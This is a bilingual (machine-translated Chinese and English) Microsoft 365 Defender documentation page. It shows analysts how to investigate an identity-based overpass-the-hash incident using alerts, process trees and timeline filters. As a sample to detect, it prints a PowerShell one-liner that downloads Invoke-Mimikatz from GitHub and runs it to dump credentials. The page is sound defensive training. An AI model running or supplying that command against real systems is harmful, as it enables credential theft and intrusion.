---
title: 基于身份的攻击示例
description: 逐步完成基于身份的攻击的示例分析。
keywords: 事件， 警报， 调查， 关联， 攻击， 计算机， 设备， 用户， 标识， 标识， 邮箱， 电子邮件， 365， microsoft， m365， 事件响应， 网络攻击
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841002"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="2a651-104">基于身份的攻击示例</span><span class="sxs-lookup"><span data-stu-id="2a651-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="2a651-105">**适用于：**</span><span class="sxs-lookup"><span data-stu-id="2a651-105">**Applies to:**</span></span>
- <span data-ttu-id="2a651-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="2a651-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="2a651-107">Microsoft Defender for Identity 可以帮助检测恶意尝试来破坏你组织中的身份。</span><span class="sxs-lookup"><span data-stu-id="2a651-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="2a651-108">由于 Defender for Identity 与 Microsoft 365 Defender 集成，因此安全分析师可以了解来自 Defender for Identity 的威胁，例如可疑的 Netlogon 特权提升尝试。</span><span class="sxs-lookup"><span data-stu-id="2a651-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="2a651-109">分析 Microsoft Defender 中针对标识的攻击</span><span class="sxs-lookup"><span data-stu-id="2a651-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="2a651-110">Microsoft 365Defender 允许分析员按事件页面的"**警报**"选项卡上的检测源筛选警报。</span><span class="sxs-lookup"><span data-stu-id="2a651-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="2a651-111">在下面的示例中，将检测源筛选为 Defender **for Identity**。</span><span class="sxs-lookup"><span data-stu-id="2a651-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="筛选 Defender for Identity 的检测源的示例":::

<span data-ttu-id="2a651-113">选择 **可疑的哈希攻击警报** 将转到显示Microsoft Cloud App Security详细信息的页面。</span><span class="sxs-lookup"><span data-stu-id="2a651-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="2a651-114">通过选择"了解有关此警报类型"以阅读攻击描述以及修正建议，你始终可以了解有关警报或[](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)攻击的更多信息。</span><span class="sxs-lookup"><span data-stu-id="2a651-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="可疑的哈希攻击警报示例"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="2a651-116">调查 Microsoft Defender for Endpoint 中的相同攻击</span><span class="sxs-lookup"><span data-stu-id="2a651-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="2a651-117">或者，分析员可以使用 Defender for Endpoint 了解有关终结点上活动更多信息。</span><span class="sxs-lookup"><span data-stu-id="2a651-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="2a651-118">从事件队列中选择事件，然后选择" **警报"** 选项卡。在这里，他们还可以识别检测源。</span><span class="sxs-lookup"><span data-stu-id="2a651-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="2a651-119">标记为"终结点"的EDR表示终结点检测和响应，即 Endpoint 的 Defender。</span><span class="sxs-lookup"><span data-stu-id="2a651-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="2a651-120">从此处，分析员选择由用户检测到EDR。</span><span class="sxs-lookup"><span data-stu-id="2a651-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Defender for Endpoint 中的终结点检测和响应示例"::: 

<span data-ttu-id="2a651-122">警报页面显示各种相关信息，如影响的设备名称、用户名、自动调查的状态以及警报详细信息。</span><span class="sxs-lookup"><span data-stu-id="2a651-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="2a651-123">警报情景描述进程树的可视化表示形式。</span><span class="sxs-lookup"><span data-stu-id="2a651-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="2a651-124">进程树是与警报相关的父进程和子进程的分层表示形式。</span><span class="sxs-lookup"><span data-stu-id="2a651-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Defender for Endpoint 中的警报进程树示例"::: 

<span data-ttu-id="2a651-126">可以展开每个进程以查看其他详细信息。</span><span class="sxs-lookup"><span data-stu-id="2a651-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="2a651-127">分析师可以看到的详细信息是作为恶意脚本的一部分输入的实际命令、出站连接 IP 地址和其他有用信息。</span><span class="sxs-lookup"><span data-stu-id="2a651-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Defender for Endpoint 中进程详细信息的示例":::
 
<span data-ttu-id="2a651-129">通过选择 **"在时间线中** 查看"，分析员可以进一步向下钻取以确定泄露的确切时间。</span><span class="sxs-lookup"><span data-stu-id="2a651-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="2a651-130">Microsoft Defender for Endpoint 可以检测许多恶意文件和脚本。</span><span class="sxs-lookup"><span data-stu-id="2a651-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="2a651-131">但是，由于出站连接、PowerShell 和命令行活动的许多合法用途，某些活动在创建恶意文件或活动之前被视为恶意活动。</span><span class="sxs-lookup"><span data-stu-id="2a651-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="2a651-132">因此，使用时间线可帮助分析员将警报置于与周围活动的上下文中，以确定攻击的原始源或时间，否则，常见文件系统和用户活动会掩盖这些攻击。</span><span class="sxs-lookup"><span data-stu-id="2a651-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="2a651-133">为完成此操作，分析员将在警报检测 (以红色) 并及时向后滚动，以确定导致恶意活动的原始活动何时实际启动。</span><span class="sxs-lookup"><span data-stu-id="2a651-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="警报检测时开始的示例"::: 

<span data-ttu-id="2a651-135">了解并区分常见活动（如 Windows 更新连接、Windows 受信任的软件激活通信、与 Microsoft 站点的其他常见连接、第三方 Internet 活动、Microsoft Endpoint Configuration Manager 活动和其他恶意活动与可疑活动）非常重要。</span><span class="sxs-lookup"><span data-stu-id="2a651-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="2a651-136">实现此目的的一个方法就是使用时间线筛选器。</span><span class="sxs-lookup"><span data-stu-id="2a651-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="2a651-137">有许多筛选器可在筛选掉分析员不想查看的一切内容时突出显示特定活动。</span><span class="sxs-lookup"><span data-stu-id="2a651-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="2a651-138">在下图中，分析员经过筛选，以便仅查看网络和处理事件。</span><span class="sxs-lookup"><span data-stu-id="2a651-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="2a651-139">这允许分析师查看围绕事件（记事本 IP 地址建立连接）的网络连接和进程，我们在进程树中也可以看到这一点。</span><span class="sxs-lookup"><span data-stu-id="2a651-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="如何使用 记事本进行恶意出站连接的示例"::: 

<span data-ttu-id="2a651-141">在此特定事件记事本，该邮件用于建立恶意出站连接。</span><span class="sxs-lookup"><span data-stu-id="2a651-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="2a651-142">但是，攻击者通常只会iexplorer.exe来建立连接来下载恶意负载，因为通常iexplorer.exe进程被视为常规 Web 浏览器活动。</span><span class="sxs-lookup"><span data-stu-id="2a651-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="2a651-143">时间线中要查找的另一项是 PowerShell 用于出站连接。</span><span class="sxs-lookup"><span data-stu-id="2a651-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="2a651-144">分析员会通过命令（如 后跟托管恶意文件的网站的出站连接）查找成功的 PowerShell `IEX (New-Object Net.Webclient)` 连接。</span><span class="sxs-lookup"><span data-stu-id="2a651-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="2a651-145">在下面的示例中，PowerShell 用于从网站下载和执行 Mimikatz：</span><span class="sxs-lookup"><span data-stu-id="2a651-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="2a651-146">分析员可以通过在搜索栏中键入关键字来快速搜索关键字，以仅显示使用 PowerShell 创建的事件。</span><span class="sxs-lookup"><span data-stu-id="2a651-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="2a651-147">后续步骤</span><span class="sxs-lookup"><span data-stu-id="2a651-147">Next step</span></span>

<span data-ttu-id="2a651-148">请参阅 [网络钓鱼调查](first-incident-path-phishing.md) 路径。</span><span class="sxs-lookup"><span data-stu-id="2a651-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="2a651-149">另请参阅</span><span class="sxs-lookup"><span data-stu-id="2a651-149">See also</span></span>

- [<span data-ttu-id="2a651-150">事件概述</span><span class="sxs-lookup"><span data-stu-id="2a651-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="2a651-151">管理事件</span><span class="sxs-lookup"><span data-stu-id="2a651-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="2a651-152">调查事件</span><span class="sxs-lookup"><span data-stu-id="2a651-152">Investigate incidents</span></span>](investigate-incidents.md)
